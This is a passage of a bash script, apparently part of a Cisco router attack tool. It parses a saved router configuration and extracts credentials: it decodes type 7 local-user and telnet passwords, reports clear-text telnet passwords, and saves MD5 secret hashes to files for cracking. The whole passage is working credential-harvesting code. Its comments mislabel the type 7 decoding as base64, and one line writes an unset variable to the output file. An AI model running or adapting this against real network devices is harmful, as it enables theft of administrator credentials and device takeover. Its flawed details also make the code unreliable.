		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} The following local user account was found with a encoded type 7 password"
		printf '\r%s \n\n' "${BRIGHT}${GREEN}"$ENLOCAL7"${NORMAL}"
		ENLOCAL7VAL=$(cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "username" |grep "password 7" |awk '{print $NF}' 2>&1)
		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} User ${BRIGHT}${GREEN}"$ENLOCAL7"${NORMAL} encoded password value is:"
		printf '\r%s \n\n' "${BRIGHT}${GREEN}"$ENLOCAL7VAL"${NORMAL}"
		printf '\r%s \n' "$ENPW7" >"$OUTPUTDIR$CISCOIP-ciscolocal7pw.txt"
			
		BASE64="$ENLOCAL7VAL"
		export BASE64
		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} The decoded password for user ${BRIGHT}${GREEN}"$ENLOCAL7"${NORMAL} is:"
		# Run perl base64 decode function
		perldecode
else
		printf '\r\n%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} No local users accounts were found on the device"
fi
}
localencoded

telnetclear(){
# look for encoded telnet passwords
VTPPW7=$(cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep -B1 "login" |grep "password 7" |awk '{print $NF}' |head -1 2>&1)
if [ -z "$VTPPW7" ]
	then
		printf '\r\n%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} There doesn't seem to be any encoded telnet passwords set"
	else
		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} The following encoded telnet password was found"
		printf '\r%s \n\n' "${BRIGHT}${GREEN}"$VTPPW7"${NORMAL}"
		BASE64="$VTPPW7"
		export BASE64
		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} The decoded telnet type 7 password is:"
		# Run perl base64 decode function
		perldecode

fi
# look for clear text telnet passwords
    VTYPWCLRREV=$(cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep -B1 "login" |grep "password" |awk '{print $NF}' |sort --unique 2>&1)
	VTYPWCLRREV2=$(cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep -B1 "login" |grep "password 7" |awk '{print $NF}' |sort --unique 2>&1)
if [ -z "$VTYPWCLRREV" ]
	then
		printf '\r\n%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} No telnet password for login appears to be set"
elif [ -n "$VTYPWCLRREV2" ]
	then
		printf '\n'
	else
		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} The following clear text telnet password was found"
		printf '\r%s \n\n' "${BRIGHT}${GREEN}"$VTYPWCLRREV"${NORMAL}"

fi

}
telnetclear

localusermd5() {
# look for any local users with MD5 set
LOCPW5=$(cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "username" |grep "secret 5" |cut -d " " -f 2,5 2>&1 )
if [ -z "$LOCPW5" ]
	then
		printf '\r\n%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} No local user accounts with MD5 were found to be set."
	else
		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} The following local users with MD5 passwords were found."
		printf '\r%s %s \n\n' "${BRIGHT}${GREEN}"$LOCPW5"${NORMAL}"
		printf '\r%s \n' "$LOCPW5" >"$OUTPUTDIR$CISCOIP-ciscolocalusersecret5pw.txt"
fi

}

localusermd5

enablesecretmd5() {
# get enable secret md5 hash
SECPW5=$(cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "enable secret 5" |awk '{ print $NF }' 2>&1)
	if [ -z "$SECPW5" ]
		then
			printf '\r\n%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} No Enable Secret MD5 found."
			rm *.tmp 2>/dev/null
			exit 0
		else
			printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL} The following Enable Secret MD5 was found to be set."
			printf '\r%s %s \n\n' "${BRIGHT}${GREEN}"$SECPW5"${NORMAL}"
			printf '\r%s \n' "$SECPW5" >"$OUTPUTDIR$CISCOIP-ciscosecret5pw.txt"
	fi
}
enablesecretmd5
rm *.tmp 2>/dev/null
#END
